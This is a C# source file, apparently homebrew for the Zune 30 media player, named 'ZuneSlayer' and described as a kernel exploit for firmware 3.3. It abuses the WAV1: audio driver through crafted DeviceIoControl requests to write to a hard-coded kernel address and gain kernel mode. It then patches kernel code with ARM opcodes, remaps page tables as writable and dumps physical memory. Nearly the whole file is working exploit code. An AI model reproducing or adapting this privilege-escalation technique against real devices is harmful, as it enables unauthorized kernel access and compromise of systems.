/*  _____                         ________   ____    __  __
 * /\  __`\                      /\_____  \ /\  _`\ /\ \/\ \
 * \ \ \/\ \  _____     __    ___\/____//'/'\ \ \/\ \ \ \/'/'
 *  \ \ \ \ \/\ '__`\ /'__`\/' _ `\   //'/'  \ \ \ \ \ \ , <
 *   \ \ \_\ \ \ \L\ \\  __//\ \/\ \ //'/'___ \ \ \_\ \ \ \\`\
 *    \ \_____\ \ ,__/ \____\ \_\ \_\/\_______\\ \____/\ \_\ \_\
 *     \/_____/\ \ \/ \/____/\/_/\/_/\/_______/ \/___/  \/_/\/_/
 *              \ \_\
 *               \/_/ OpenZDK Release 1 | 2010-04-14
 *
 * Program.cs
 * Copyright (c) 2010 itsnotabigtruck.
 * No rights reserved.
 * 
 * All rights are waived to the maximum extent possible; see
 * http://creativecommons.org/publicdomain/zero/1.0/ for more information
 *
 * Replace this banner when writing your own applications
 */

// deployed 3.1.10527.100 with edt

/* 
	ZuneSlayer 30

	Kernel Exploit for Zune 30 (keel) (offsets specific to fw v3.3)

	Shy Bairns Get Nowt
 */

using System;
using System.Diagnostics;
using System.IO;

namespace ZuneBoards.DevelopmentFront.NativeAppLauncher.SD
{
    static class Program
    {
        const string SourceDirectory = @"\gametitle\584E07D1\";
        const string Payload =         @"Content\nativeapp.exe";

        static void Main(string[] args)
        {
            Run();
        }
        public static void Run()
        {

            unsafe
            {
                int le = 0;
                int b = 1;
                uint cur = 0;

                Trace.WriteLine("[*] ==== ZuneSlayer by CUB3D ====");

                Trace.WriteLine("[*] Are we in kernel mode?");
                cur = NativeMethods.IsBadReadPtr(0x80000000, 0x10);
                Trace.WriteLine("[*] IsBadReadPtr(Kernel) = " + cur.ToString("X"));

                // already in kernel, just run it
                if (cur == 0)
                {
                    Program.func1(0);
                    return;
                }

                Trace.WriteLine("[*] Open driver");
                int file = NativeMethods.CreateFileW("WAV1:", 0x80000000, 0, 0, 3, 0x80, 0);

                uint* outb = (uint*)NativeMethods.calloc(1024, 1);
                uint* inp = (uint*)NativeMethods.calloc(1024, 1);
                uint* outp = (uint*)NativeMethods.calloc(1024, 1);

                uint tgt_val = 0;
                uint tgt_addr = 0x88f81a94;

                Trace.WriteLine("[*] Writing g_seggregate = 0");

                if (true)
                {
                    Trace.WriteLine("[*] Writing tgt_val = " + tgt_val.ToString("X"));
                    *inp = 0; // unused
                    *(inp + 1) = 0x11; // cmd
                    *(inp + 2) = 0; // d
                    *(inp + 3) = tgt_val; // b
                    *(inp + 4) = 0; //c
                    b = NativeMethods.DeviceIoControl(file, 0x1d000c, (int)inp, 1024, (int)outb, 1024, (int)outp, 0);
                    le = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                    Trace.WriteLine("[*] stage1, b = " + b.ToString("X") + ", LE:" + le.ToString("X") + ", ob: " + (*outb).ToString("X"));

                        if (b != 0)
                        {
                            Trace.WriteLine("[*] OK, Writing tgt_addr = " + tgt_addr.ToString("X"));

                            *inp = 0; // unused
                            *(inp + 1) = 0x10; //cmd
                            *(inp + 2) = 0; // d
                            *(inp + 3) = tgt_addr; //b
                            *(inp + 4) = 0; // c
                            b = NativeMethods.DeviceIoControl(file, 0x1d000c, (int)inp, 1024, (int)outb, 1024, (int)outp, 0);
                            le = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                            Trace.WriteLine("[*] stage 2, b = " + b.ToString("X") + ", LE:" + le.ToString("X") + ", ob: " + (*outb).ToString("X"));
                        }
                }


                Trace.WriteLine("[*] Are we in kernel mode now?");
                cur = NativeMethods.IsBadReadPtr(0x80000000, 0x10);
                Trace.WriteLine("[*] IsBadReadPtr(Kernel) = " + cur.ToString("X"));
                if (cur == 0)
                {
                    Trace.WriteLine("[*] Slay!");
                }
            }

        }

        public static int func1(int a)
        {
            unsafe
            {
                byte* foo = (byte*)0x88213b44;

                if (false)
                {
                    for (int y = 0; y < 3; y++)
                    {
                        Trace.Write("[*] ");
                        for (int x = 0; x < 16; x++)
                        {
                            byte f = *(foo + x);
                            string s = f.ToString("X");
                            if (s.Length < 2)
                            {
                                s = "0" + s;
                            }
                            Trace.Write(s + " ");
                        }
                        Trace.WriteLine("");
                        foo += 16;
                    }
                }

                if (false)
                {
                    Trace.WriteLine("[*] Writing *0x88213b44 = 0xe3a00005");

                    foo = (byte*)0x88213b44;
                    uint* foo1 = (uint*)foo;
                    *foo1 = 0xe3a00005;

                    for (int y = 0; y < 3; y++)
                    {
                        Trace.Write("[*] ");
                        for (int x = 0; x < 16; x++)
                        {
                            byte f = *(foo + x);
                            string s = f.ToString("X");
                            if (s.Length < 2)
                            {
                                s = "0" + s;
                            }
                            Trace.Write(s + " ");
                        }
                        Trace.WriteLine("");
                        foo += 16;
                    }
                }



                // changing control registers
                if (false)
                {
                    // mrc p15, 0, r0, cr1, cr0, 0
                    *(uint*)(0x8821f988 + 0x00) = 0xee110f10;
                    // mov r1, 0xff000000
                    *(uint*)(0x8821f988 + 0x04) = 0xe3a014ff;
                    // add r1, r1, 0xff0000
                    *(uint*)(0x8821f988 + 0x08) = 0xe28118ff;
                    // add r1, r1, 0xfe00
                    *(uint*)(0x8821f988 + 0x0c) = 0xe2811cfe;
                    // add r1, r1, 0xff
                    *(uint*)(0x8821f988 + 0x10) = 0xe28110ff;
                    // and r0, r0, r1
                    *(uint*)(0x8821f988 + 0x14) = 0xe0000001;
                    // mcr p15, 0, r0, cr1, cr0, 0
                    *(uint*)(0x8821f988 + 0x18) = 0xee010f10;
                    // mov pc lr
                    *(uint*)(0x8821f988 + 0x1c) = 0xe1a0f00e;

                    Trace.WriteLine("- - - - ");
                    uint x = (uint)NativeMethods.GetFSHeapInfo(0, 0);
                    Trace.WriteLine("x = " + x.ToString("X"));
                    Trace.WriteLine("- - - - ");
                    return 0;
                }


                //phys mem read, works
                if (true)
                {
                    uint pt_ff = 0xFFFD0000;
                    if (false)
                    {
                        uint tmp = pt_ff;
                        for (int y = 0; y < 0x4000 / (4 * 4); y++)
                        {
                            //Trace.Write("[*] ");
                            for (int x = 0; x < 4; x++)
                            {
                                uint f = *(uint*)(tmp + x * 4);
                                string s = f.ToString("X");
                                /*while (s.Length < 8)
                                {
                                    s = "0" + s;
                                }*/
                                Trace.Write(s + " ");
                            }
                            Trace.WriteLine("");
                            tmp += 16;
                        }
                    }


                    // map second lvl pg tbl as writable
                    uint v = (*(uint*)(pt_ff + (0x4000 - 8- 4*5)));

                    Trace.WriteLine("v = " + (v).ToString("X"));
                    *(uint*)(pt_ff + (0x4000 - 8 - 4*5)) = (3 << 10) | (1 << 1) | (1 << 18) | (((0 >> 24) & 0xFF) << 24);
                    //*(uint*)(pt_ff + (0x4000 - 8 - 4 * 5)) = 0;
                    //v = (*(uint*)(pt_ff + (0x4000 - 8 - 4*5)));
                   // Trace.WriteLine("v = " + (v).ToString("X"));
                    //v = (*(uint*)(0xff900000));
                    //Trace.WriteLine("v = " + (v).ToString("X"));


                    if (true)
                    {
                        uint tmp = 0xff900000;// +0x00408000;
                        Byte[] dx = new Byte[0x1000];
                        uint dxi = 0;
                        for (int y = 0; y < 0x100; y++)
                        {
                            *(uint*)(pt_ff + (0x4000 - 8 - 4 * 5)) = (3 << 10) | (1 << 1) | (1 << 18) | (((0 >> 24) & 0xFF) << 24);

                            //Trace.Write("[*] ");
                            for (int x = 0; x < 1; x++)
                            {
                                uint f = *(uint*)(tmp + x*4);
                                dx[dxi++] = (byte)(f & 0xFF);
                                dx[dxi++] = (byte)((f >> 8) & 0xFF);
                                dx[dxi++] = (byte)((f >> 16) & 0xFF);
                                dx[dxi++] = (byte)((f >> 24) & 0xFF);
                                string s = f.ToString("X");
                                while (s.Length < 2)
                                {
                                    s = "0" + s;
                                }
                               // Trace.Write(s + " ");
                            }
                           // Trace.WriteLine("");

                           Trace.WriteLine(System.Convert.ToBase64String(dx));
                            

                            tmp += 4;
                        }
                    }
                    Trace.WriteLine("- - - - ");

                    return 0;
                }


                Trace.WriteLine("");
                Trace.WriteLine("");
                Trace.WriteLine("");


                if (false)
                {
                    // get ttbcr
                    uint* foo2 = (uint*)0x8821f9b4;
                    // mrc p15 0, r0, cr2, cr0, 2
                    *foo2 = 0xee120f50;

                    uint ttbcr = (uint)NativeMethods.GetFSHeapInfo(0x00001000 >> 8, 0x1000);
                    Trace.WriteLine("ttbcr = " + ((uint)ttbcr).ToString("X"));

                }
                
            }

            Trace.WriteLine("");
            Trace.WriteLine("");
            Trace.WriteLine("");

            

            //NativeMethods.ExitThread(0x69);

            return 0;
        }
    }
}
